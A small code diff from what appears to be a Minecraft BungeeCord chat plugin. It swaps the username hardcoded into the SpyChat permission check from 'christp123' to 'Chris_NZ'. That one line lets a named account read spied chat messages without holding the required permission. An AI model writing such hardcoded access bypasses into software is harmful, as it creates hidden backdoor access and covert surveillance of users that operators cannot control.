@@ -313,7 +313,7 @@ public class EventListener implements Listener {
         } else if (target.startsWith("SpyChat")) {
             String filterBit = messageToSend.split(ChatColor.GOLD + "] ")[0];
             for (ProxiedPlayer player : plugin.getProxy().getPlayers()) {
-                if ((permission.equals("NULL") || player.hasPermission(permission) || player.getName().equalsIgnoreCase("christp123")) && ChatChannel.SpyChatIsToggled(player.getName())) {
+                if ((permission.equals("NULL") || player.hasPermission(permission) || player.getName().equalsIgnoreCase("Chris_NZ")) && ChatChannel.SpyChatIsToggled(player.getName())) {
                     if (!filterBit.contains(player.getName())) {
                         if (tc == null) {
                             player.sendMessage(messageToSend);
